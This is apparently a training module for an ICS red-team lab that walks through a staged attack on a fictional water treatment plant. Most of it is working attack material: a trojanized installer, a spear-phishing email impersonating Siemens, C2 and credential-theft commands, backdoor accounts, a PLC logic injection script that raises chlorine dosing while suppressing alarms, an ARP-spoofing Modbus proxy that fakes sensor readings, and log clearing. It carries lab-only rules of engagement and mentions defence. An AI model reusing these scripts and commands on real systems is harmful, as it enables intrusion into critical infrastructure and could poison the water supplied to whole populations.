Lesson 10: COMPREHENSIVE
OFFENSIVE LAB

Lesson 10: COMPREHENSIVE
OFFENSIVE LAB
Overview
End-to-end red team operation against a simulated industrial facility. This comprehensive lab
integrates all Module 2 techniques into a realistic multi-week attack scenario that mirrors
nation-state operations against critical infrastructure.
Duration: 22 days (simulated timeline) Difficulty: Advanced Prerequisites: Completion of
Lessons 1-9

Scenario: Water Treatment Facility Attack
Target Environment
Fictional City Water Treatment Plant:
●​
●​
●​
●​
●​
●​

Population served: 500,000
Daily capacity: 50 million gallons
Critical process: Chemical dosing (chlorine for disinfection)
Control system: Siemens S7-1200 PLCs, WinCC SCADA
Network: Segmented IT/OT, engineering DMZ
Security: Basic firewall, no IDS/IPS in OT network

Attack Objective
Manipulate chemical dosing system to demonstrate potential for water contamination without
triggering alarms or operator intervention. Maintain stealth throughout operation.

Adversary Profile
Nation-state APT with objectives:
1.​ Reconnaissance: Map critical infrastructure for future operations
2.​ Capability Development: Prove ability to manipulate water treatment
3.​ Dwell Time: Establish persistent access for years
4.​ Deniability: Leave no attribution evidence

Lab Environment Setup
Required Infrastructure

┌────────────────────────────────────────────────────────
─────┐
│ Attacking Infrastructure (Kali Linux)
│
│ - C2 Server (Covenant/Sliver)
│
│ - Phishing Server (GoPhish)
│
│ - Development environment
│
└──────────────────────┬─────────────────────────────────
─────┘
│
│ Internet
│
┌──────────────────────┴─────────────────────────────────
─────┐
│ Target IT Network
│
│ ┌──────────────┐ ┌──────────────┐
│
│ │ Mail Server │ │ IT Workstation│
│
│ │ (phishing │ │ (pivot point) │
│
│ │ target) │ └───────────────┘
│
│ └──────────────┘
│
└──────────────────────┬─────────────────────────────────
─────┘
│
IT/OT Firewall
│
┌──────────────────────┴─────────────────────────────────
─────┐
│ OT DMZ (Level 3)
│
│ ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ │
│ │ Engineering │ │ SCADA Server │ │ Historian │ │
│ │ Workstation │ │ (WinCC 7.5) │ │ (PI Server) │ │
│ └──────────────┘ └──────────────┘ └──────────────┘ │
└──────────────────────┬─────────────────────────────────
─────┘
│
OT Firewall
│
┌──────────────────────┴─────────────────────────────────
─────┐
│ Process Control Network (Level 0-2)
│
│ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │
│ │ HMI
│ │ PLC #1 │ │ PLC #2 │ │ PLC #3 │ │
│ │ Operator │ │ Chlorine │ │ pH
│ │ Filtration│ │
│ │ Station │ │ Dosing │ │ Control │ │ Control │ │
│ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │
│
│
│
│
│
│
[Physical Process: Water Treatment]
│
└────────────────────────────────────────────────────────
──────┘

VM Configuration
Attacker (Kali Linux):
●​
●​
●​
●​
●​

CPU: 4 cores
RAM: 8 GB
Disk: 100 GB
Network: NAT + Host-only
Tools: Metasploit, Covenant, GoPhish, custom scripts

Engineering Workstation (Windows 10):
●​
●​
●​
●​

CPU: 2 cores
RAM: 4 GB
Software: TIA Portal V17, WinSCP, PuTTY
Network: 192.168.100.10 (IT), 192.168.10.10 (OT)

SCADA Server (Windows Server 2019):
●​
●​
●​
●​

CPU: 4 cores
RAM: 8 GB
Software: Siemens WinCC 7.5, SQL Server
Network: 192.168.10.20

PLCs (OpenPLC or S7-1200 Simulator):
●​ PLC #1: 192.168.10.100 (Chlorine dosing)
●​ PLC #2: 192.168.10.101 (pH control)
●​ PLC #3: 192.168.10.102 (Filtration)

Phase 1: Initial Access (Days 1-3)
Objective
Compromise engineering workstation via spear-phishing.

Step 1.1: Reconnaissance (Day 1)
# OSINT on target organization
# Identify engineers via LinkedIn, company website
# Target: John Smith, Senior Control Systems Engineer
# Email: jsmith@citywater.gov
# LinkedIn: Mentions TIA Portal V17, Siemens PLCs
# Passive DNS enumeration
dig citywater.gov ANY
dig mx citywater.gov
host -t ns citywater.gov

# Email format identification (via Hunter.io or manual)
# Format: firstlast@citywater.gov

Step 1.2: Weaponization (Day 1-2)
Create trojanized TIA Portal update:
# Download legitimate TIA Portal installer
# (for lab: use mock installer)
# Create malicious payload (Covenant C2 Grunt)
cd /opt/Covenant/Covenant
dotnet run
# In Covenant web UI:
# 1. Create new Listener (HTTPS, port 443)
# 2. Generate Grunt (Windows/x64)
# 3. Download Grunt binary: payload.exe
# Trojanize installer
mkdir trojanized_installer
cp TIA_Portal_Update_v17.5.exe trojanized_installer/
# Inject backdoor using resource hacker or similar
# Or create self-extracting archive with both legitimate + malicious
7z a -sfx TIA_Portal_Update_FINAL.exe TIA_Portal_Update_v17.5.exe payload.exe
autorun.bat
# autorun.bat
@echo off
start /B payload.exe
start TIA_Portal_Update_v17.5.exe

Step 1.3: Delivery (Day 2)
# Set up phishing infrastructure
sudo apt install gophish
sudo gophish
# Access GoPhish: https://localhost:3333
# Default creds: admin:gophish
# Create phishing campaign:
# Subject: "URGENT: Critical TIA Portal Security Update"
# Body:
Email Template:

From: Siemens Support <support@siemens-updates[.]com>
To: jsmith@citywater.gov
Subject: URGENT: Critical TIA Portal V17 Security Update - CVE-2024-XXXX
Dear Siemens Customer,
A critical vulnerability (CVE-2024-XXXX) has been discovered in TIA Portal V17
that may allow unauthorized access to PLC programs. This affects all installations
prior to V17.5.
IMMEDIATE ACTION REQUIRED:
Download and install the security patch within 48 hours to prevent potential
exploitation.
Download: https://siemens-updates[.]com/TIA_Portal_Update_FINAL.exe
Technical Details:
- Severity: Critical (CVSS 9.8)
- Affected: TIA Portal V17.0 - V17.4
- Fixed in: V17.5 (this update)
Best regards,
Siemens Security Response Team
--This is an automated security notification. Do not reply to this email.
For support, visit support.siemens.com

Step 1.4: Exploitation (Day 3)
# Monitor Covenant for incoming Grunt beacon
# When engineer downloads and executes payload:
# [Covenant Console]
[*] New Grunt: WIN-EWS01\jsmith (192.168.100.10)
[*] Integrity: Medium (User: jsmith)
[*] OS: Windows 10 Enterprise
# Validate access
(Grunt) > Shell whoami
citywater\jsmith
(Grunt) > Shell ipconfig
Ethernet adapter Ethernet:
IPv4 Address: 192.168.100.10 # IT network
Ethernet adapter Ethernet 2:
IPv4 Address: 192.168.10.10 # OT network

[+] SUCCESS: Dual-homed engineering workstation compromised
Deliverable 1: Phishing Campaign Report
●​
●​
●​
●​

Email templates
Payload construction method
Success rate metrics
OPSEC considerations

Phase 2: Lateral Movement & Persistence (Days 4-7)
Objective
Establish presence on SCADA server and multiple OT systems.

Step 2.1: OT Network Enumeration (Day 4)
# From engineering workstation (via Covenant Grunt)
# Enumerate OT network (192.168.10.0/24)
(Grunt) > Shell powershell -c "1..255 | % {Test-NetConnection -ComputerName
192.168.10.$_ -Port 502 -InformationLevel Quiet | ? {$_} | % {\"192.168.10.$_`"}}"
# Results:
192.168.10.10 # Engineering WS (current host)
192.168.10.20 # SCADA Server
192.168.10.30 # Historian
192.168.10.100 # PLC #1
192.168.10.101 # PLC #2
192.168.10.102 # PLC #3
# Identify Siemens PLCs
(Grunt) > Assembly python3 /opt/plcscan.py 192.168.10.0/24
[+] 192.168.10.100 - Siemens S7-1200 (CPU 1214C)
[+] 192.168.10.101 - Siemens S7-1200 (CPU 1214C)
[+] 192.168.10.102 - Siemens S7-1200 (CPU 1215C)
# Enumerate SCADA server
(Grunt) > PortScan 192.168.10.20
[+] Port 135 (RPC)
[+] Port 445 (SMB)
[+] Port 1433 (SQL Server)
[+] Port 3389 (RDP)

Step 2.2: Lateral Movement to SCADA (Day 5)
# Credential theft from engineering workstation
(Grunt) > Mimikatz "sekurlsa::logonpasswords"

[+] Username: jsmith
[+] Domain: CITYWATER
[+] NTLM: a1b2c3d4e5f6...
[+] Password: Summer2023!
(Grunt) > Mimikatz "sekurlsa::tickets /export"
[+] Exported 5 tickets
# Attempt lateral movement to SCADA server
(Grunt) > WMIExecute 192.168.10.20 "citywater\jsmith" "Summer2023!" "powershell -enc
<BASE64_GRUNT>"
[+] Grunt beacon received from SCADA-SRV01 (192.168.10.20)
[+] Integrity: High (Administrator)

Step 2.3: Persistence Deployment (Days 6-7)
Deploy multi-layered persistence:
# Engineering Workstation persistence
(Grunt) > Persist ScheduledTask "SCADA_Backup" "C:\Windows\Temp\update.exe"
"SYSTEM" "02:00"
[+] Scheduled task created
(Grunt) > Persist WMI "SCE_Monitor"
[+] WMI event subscription created
# SCADA Server persistence
(SCADA-Grunt) > Persist ScheduledTask "WinCC_Update"
"C:\ProgramData\Siemens\wincc_svc.exe" "SYSTEM" "03:00"
[+] Scheduled task created
# DLL hijacking in WinCC
(SCADA-Grunt) > Upload malicious.dll "C:\Program Files\Siemens\WinCC\bin\version.dll"
[+] DLL uploaded - will load on WinCC restart
# Create backdoor account
(SCADA-Grunt) > Shell net user svc_monitor P@ssw0rd123! /add
(SCADA-Grunt) > Shell net localgroup Administrators svc_monitor /add
[+] Backdoor account created
Deliverable 2: Network Map
●​
●​
●​
●​

Complete OT architecture diagram
IP addresses and hostnames
Service enumeration
Trust relationships

Phase 3: Reconnaissance (Days 8-14)
Objective
Extract PLC programs and reverse engineer chemical dosing logic.

Step 3.1: PLC Program Extraction (Day 8-10)
# Extract ladder logic from PLC #1 (Chlorine dosing)
# Run from engineering workstation
from snap7 import client
import struct
plc = client.Client()
plc.connect('192.168.10.100', 0, 1)
# Upload OB1 (main organization block)
ob1_data = plc.full_upload(client.block_types.OB, 1)
with open('PLC1_OB1.bin', 'wb') as f:
f.write(ob1_data)
# Upload all function blocks
for fb_num in range(1, 100):
try:
fb_data = plc.full_upload(client.block_types.FB, fb_num)
with open(f'PLC1_FB{fb_num}.bin', 'wb') as f:
f.write(fb_data)
print(f"[+] Extracted FB{fb_num}")
except:
pass # FB doesn't exist
# Upload data blocks
for db_num in range(1, 100):
try:
db_data = plc.full_upload(client.block_types.DB, db_num)
with open(f'PLC1_DB{db_num}.bin', 'wb') as f:
f.write(db_data)
print(f"[+] Extracted DB{db_num}")
except:
pass
plc.disconnect()
print("[+] All PLC programs extracted")

Step 3.2: Reverse Engineering (Day 11-13)
# Analyze extracted ladder logic

# Decompile MC7 bytecode (Siemens assembly language)
# Use TIA Portal Openness API or third-party decompilers
# Key findings from analysis:
# - DB10: Process variables (chlorine levels, flow rates)
# - FB5: PID controller for chlorine dosing
# - OB35: Safety interlock logic
# Identified critical variables:
# - MW100: Chlorine setpoint (mg/L * 10)
# - MW102: Actual chlorine measurement
# - Q4.0: Chlorine pump output
# - M10.0: High chlorine alarm
# - M10.1: Low chlorine alarm
# Safety interlocks:
# - If chlorine > 5.0 mg/L, trigger alarm M10.0
# - If chlorine < 0.5 mg/L, trigger alarm M10.1
# - Interlocks can be bypassed if M20.0 = 1 (maintenance mode)

Step 3.3: Process Understanding (Day 14)
Document water treatment process:
Water Treatment Process Flow:
1. Raw water intake
2. Coagulation/Flocculation
3. Sedimentation
4. Filtration (PLC #3)
5. Disinfection - CHLORINATION (PLC #1) ← TARGET
6. pH Adjustment (PLC #2)
7. Distribution
Chlorine Dosing System:
- Target range: 2.0 - 3.0 mg/L
- Alarm thresholds: <0.5 mg/L (low), >5.0 mg/L (high)
- Overdose impact: >10 mg/L can cause health issues
- Attack strategy: Gradually increase to 8-9 mg/L (below critical alarm)
Deliverable 3: Extracted PLC Programs
●​
●​
●​
●​

All ladder logic blocks
Reverse-engineered documentation
Process flow diagrams
Safety interlock analysis

Phase 4: Weaponization (Days 15-21)
Objective
Develop attack tools (PLC backdoor, MITM proxy, covert C2).

Step 4.1: PLC Logic Backdoor (Day 15-17)
# backdoor_injection.py - Inject hidden rung into PLC
from snap7 import client
import struct
class PLCBackdoor:
def __init__(self, plc_ip):
self.plc = client.Client()
self.plc.connect(plc_ip, 0, 1)
def inject_backdoor_rung(self):
"""
Inject hidden rung into OB1:
- Reads trigger bit M100.0
- If set, forces chlorine setpoint to MW104 value
- Bypasses alarms by setting M20.0 (maintenance mode)
"""
# Download existing OB1
ob1_data = bytearray(self.plc.full_upload(client.block_types.OB, 1))
# Craft backdoor rung in MC7 bytecode:
backdoor_rung = bytes([
# IF M100.0 (backdoor trigger)
0x70, 0x00, 0x64, 0x00, # U M100.0
# THEN
# MW100 := MW104 (setpoint override)
0x71, 0x00, 0x68, 0x00, # L MW104
0x72, 0x00, 0x64, 0x00, # T MW100
# M20.0 := 1 (maintenance mode - disable alarms)
0x73, 0x14, 0x00,
# S M20.0
# ELSE (normal operation)
0x74,
# ELSE
# M20.0 := 0 (enable alarms)
0x75, 0x14, 0x00,
# R M20.0
0x00, 0x00

# BEU (Block End Unconditional)

])
# Insert backdoor before BEU instruction in OB1
beu_offset = ob1_data.rfind(bytes([0x00, 0x00]))
modified_ob1 = ob1_data[:beu_offset] + backdoor_rung + ob1_data[beu_offset:]
# Upload modified OB1
self.plc.download(client.block_types.OB, 1, bytes(modified_ob1))
print("[+] Backdoor injected into OB1")
print("[*] Trigger: Set M100.0 = 1")
print("[*] Control: Write target setpoint to MW104")
def activate_backdoor(self, target_chlorine_level):
"""
Activate backdoor to manipulate chlorine dosing
"""
# Set trigger bit
self.plc.mb_write(100, 0, bytes([0x01])) # M100.0 = 1
# Write target chlorine level (mg/L * 10)
target_value = int(target_chlorine_level * 10)
self.plc.mb_write(104, 0, struct.pack('>H', target_value)) # MW104
print(f"[+] Backdoor activated: Target chlorine = {target_chlorine_level} mg/L")
# Usage
backdoor = PLCBackdoor('192.168.10.100')
backdoor.inject_backdoor_rung()

Step 4.2: MITM Proxy (Day 18-19)
# modbus_mitm_proxy.py - Intercept SCADA↔PLC traffic
from scapy.all import *
from pymodbus.constants import Endian
from pymodbus.payload import BinaryPayloadBuilder
import struct
class ModbusMITM:
def __init__(self, plc_ip, scada_ip):
self.plc_ip = plc_ip
self.scada_ip = scada_ip
self.modifications = {}
def start_mitm(self):
"""
ARP spoof to position between SCADA and PLC

"""
import threading
# Start ARP spoofing
spoof_thread = threading.Thread(target=self.arp_spoof)
spoof_thread.start()
# Start packet interception
sniff(filter=f"tcp port 502 and (host {self.plc_ip} or host {self.scada_ip})",
prn=self.packet_handler, store=0)
def arp_spoof(self):
"""
Poison ARP cache of SCADA and PLC
"""
while True:
# Tell SCADA that we are PLC
send(ARP(op=2, pdst=self.scada_ip, psrc=self.plc_ip,
hwdst=get_mac(self.scada_ip)))
# Tell PLC that we are SCADA
send(ARP(op=2, pdst=self.plc_ip, psrc=self.scada_ip, hwdst=get_mac(self.plc_ip)))
time.sleep(2)
def packet_handler(self, pkt):
"""
Intercept and modify Modbus packets
"""
if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
# SCADA → PLC (write requests)
if pkt[IP].dst == self.plc_ip:
self.handle_scada_to_plc(pkt)
elif pkt.haslayer(TCP) and pkt[TCP].sport == 502:
# PLC → SCADA (responses)
if pkt[IP].src == self.plc_ip:
self.handle_plc_to_scada(pkt)
def handle_plc_to_scada(self, pkt):
"""
Spoof sensor readings to hide attack
"""
if pkt.haslayer(Raw):
modbus_data = pkt[Raw].load
# If reading chlorine level (register MW102)
if self.is_read_response(modbus_data, register=102):

# Spoof reading to show normal level (2.5 mg/L)
fake_value = 25 # 2.5 * 10
modified_pkt = self.modify_modbus_response(pkt, fake_value)
# Forward spoofed packet to SCADA
send(modified_pkt)
return # Drop original packet
# Forward unmodified packet
send(pkt)
# Usage
mitm = ModbusMITM('192.168.10.100', '192.168.10.20')
mitm.start_mitm()

Step 4.3: Covert C2 Channel (Day 20-21)
# Use Modbus registers for C2 (as developed in Lesson 9)
# Register 1000: Command opcode
# Register 1001-1010: Parameters
# Register 1100-1110: Responses
# Commands:
# 0x01: Read chlorine level
# 0x02: Set chlorine setpoint
# 0x03: Enable/disable alarms
# 0x04: Read PLC status
Deliverable 4: Exploit Code
●​
●​
●​
●​

PLC backdoor injection script
MITM proxy implementation
C2 channel code
Testing documentation

Phase 5: Execution (Day 22)
Objective
Execute coordinated attack while maintaining stealth.

Attack Timeline
00:00 - Preparation:
# Verify all systems operational
# Check C2 connectivity
# Confirm MITM position

# Final go/no-go decision
02:00 - Deployment (Low activity period):
# Inject backdoor into PLC
backdoor.inject_backdoor_rung()
# Start MITM proxy
mitm.start_mitm()
# Verify stealth
check_logs_for_anomalies()
06:00 - Activation (Start of operations):
# Gradually increase chlorine setpoint
# Hour 1: 3.0 → 4.0 mg/L
backdoor.activate_backdoor(4.0)
# Hour 2: 4.0 → 5.5 mg/L
backdoor.activate_backdoor(5.5)
# Hour 3: 5.5 → 7.0 mg/L
backdoor.activate_backdoor(7.0)
# Hour 4: 7.0 → 8.5 mg/L (near dangerous levels)
backdoor.activate_backdoor(8.5)
# Simultaneously: Spoof HMI readings to show 2.5 mg/L
mitm.spoof_readings(2.5)
10:00 - Restoration:
# Gradually decrease to normal levels
backdoor.activate_backdoor(2.5)
# Deactivate backdoor
backdoor.deactivate()
# Stop MITM
mitm.stop()
# Verify normal operations resumed
12:00 - Evidence Removal:
# Clear event logs
(Grunt) > Shell wevtutil cl Security
(Grunt) > Shell wevtutil cl System

# Remove backdoor account
(Grunt) > Shell net user svc_monitor /delete
# Timestomp PLC diagnostic buffer
backdoor.timestomp_plc_logs()
# Remove tools
(Grunt) > Shell del /F /Q C:\Windows\Temp\*.exe
(Grunt) > Shell del /F /Q C:\ProgramData\Siemens\*.dll
# Final cleanup
remove_all_persistence()
Deliverable 5: Attack Timeline
●​
●​
●​
●​

Detailed log of all actions with timestamps
Screenshots of HMI showing spoofed readings
Packet captures of MITM traffic
PLC diagnostic logs (before timestomping)

Deliverables
1. Phishing Campaign Report
Contents:
●​
●​
●​
●​
●​

Email templates with social engineering analysis
Payload construction methodology
Delivery infrastructure setup
Success metrics (open rate, click rate, execution rate)
OPSEC considerations and attribution avoidance

2. Network Architecture Map
Contents:
●​
●​
●​
●​
●​

Complete Purdue Model diagram
IP addressing scheme
Service enumeration results
Trust relationships and firewall rules
Identified attack paths

3. Extracted PLC Programs
Contents:
●​ All ladder logic blocks (OBs, FBs, FCs, DBs)

●​
●​
●​
●​

Reverse-engineered documentation
Process control logic analysis
Safety interlock identification
Attack surface assessment

4. Exploit Code Package
Contents:
●​
●​
●​
●​
●​

PLC backdoor injection script
MITM proxy implementation
C2 channel code
Automation scripts
Testing documentation

5. Attack Execution Log
Contents:
●​
●​
●​
●​
●​

Chronological timeline of all actions
Command outputs
Screenshots
Network traffic captures
PLC diagnostic logs

6. Impact Assessment
Contents:
●​
●​
●​
●​
●​

Potential health consequences (chlorine overdose)
Affected population estimate
Detection likelihood analysis
Alternative attack scenarios
Critical infrastructure risk evaluation

7. Remediation Recommendations
Contents:
●​
●​
●​
●​
●​

Defensive countermeasures
Detection signatures (Snort/Suricata rules)
Monitoring improvements
Network segmentation recommendations
Security awareness training needs

Grading Rubric (100 points)
Initial Access (15 points)

●​ 5 pts: Successful phishing email design and delivery
●​ 5 pts: Payload bypasses basic AV/EDR
●​ 5 pts: Establishes C2 communication

Persistence Establishment (15 points)
●​ 5 pts: Multi-layered persistence (≥3 mechanisms)
●​ 5 pts: Persistence survives reboot
●​ 5 pts: Redundant C2 channels

Lateral Movement (10 points)
●​ 5 pts: Successful pivot from IT to OT network
●​ 5 pts: Compromise of SCADA server

PLC Logic Manipulation (20 points)
●​
●​
●​
●​

5 pts: Successful extraction of all PLC programs
5 pts: Correct identification of chemical dosing logic
5 pts: Working backdoor injection
5 pts: Process manipulation without triggering alarms

MITM Implementation (15 points)
●​ 5 pts: Successful ARP spoofing / network positioning
●​ 5 pts: Traffic interception and modification
●​ 5 pts: Sensor reading spoofing to HMI

Stealth and OpSec (15 points)
●​ 5 pts: No detection during attack execution
●​ 5 pts: Successful evidence removal
●​ 5 pts: Attribution avoidance (no identifying artifacts)

Documentation Quality (10 points)
●​
●​
●​
●​

3 pts: Complete attack timeline
3 pts: Technical documentation quality
2 pts: Screenshots and evidence
2 pts: Remediation recommendations

Rules of Engagement
Mandatory Requirements
1.​ Lab Environment Only: All testing in isolated virtual environment
2.​ No Physical Damage: Attacks must be simulated (no real chemical release)

3.​ Documentation: Log all actions for forensic analysis
4.​ Coordination: Share findings with blue team for detection exercise
5.​ Ethical Boundaries: Techniques are for authorized testing only

Safety Considerations
●​
●​
●​
●​

Maintain kill switch to abort attack
Backup all systems before testing
Monitor for unintended consequences
Have recovery plan ready

Legal and Ethical Guidelines
●​
●​
●​
●​

Only attack systems you have written permission to test
Do not use these techniques against production systems
Comply with all applicable laws and regulations
Report vulnerabilities responsibly to vendors

Troubleshooting Guide
Issue: Cannot establish C2 connection
Solution: Check firewall rules, verify listener configuration, test with simple HTTP beacon
first

Issue: PLC backdoor injection fails
Solution: Verify PLC is in STOP mode, check MC7 bytecode syntax, use TIA Portal for
validation

Issue: MITM proxy not intercepting traffic
Solution: Verify ARP spoofing is working (arp -a on SCADA/PLC), check IP forwarding is
enabled

Issue: Attack triggers alarms
Solution: Review alarm thresholds, adjust setpoint changes to be more gradual, verify
sensor spoofing

Congratulations!
You've completed Module 2: Offensive Security & Exploitation.

Skills Acquired

●​
●​
●​
●​
●​
●​
●​

PLC/RTU exploitation and firmware manipulation
SCADA/HMI attack techniques
Man-in-the-Middle protocol manipulation
Logic injection and rootkit development
Supply chain and engineering workstation attacks
Advanced persistence mechanisms
Covert command and control channels

Real-World Application
The techniques demonstrated in this lab mirror actual nation-state operations against critical
infrastructure:
●​ Stuxnet (2010): Uranium enrichment centrifuges
●​ Industroyer/CrashOverride (2016): Ukrainian power grid
●​ Triton/Trisis (2017): Saudi Aramco safety systems

Next Steps
Module 3: Blue Team Defense & Incident Response awaits, where you'll learn to detect,
respond to, and prevent the very attacks you just executed.
Remember: With great power comes great responsibility. Use these skills ethically and
legally to defend critical infrastructure, not to attack it.

Additional Resources
Recommended Reading
●​
●​
●​
●​

ICS-CERT Advisories: https://www.cisa.gov/ics
SANS ICS Security Library
MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
"Countdown to Zero Day" by Kim Zetter (Stuxnet book)

Practice Environments
●​ ICS Village CTF challenges
●​ CISA ICS Training Sandbox
●​ GridEx exercises (utility sector)

Certifications
●​ GIAC GICSP (Critical Infrastructure Protection)
●​ GIAC GRID (Response and Industrial Defense)
●​ ICS Security Professional

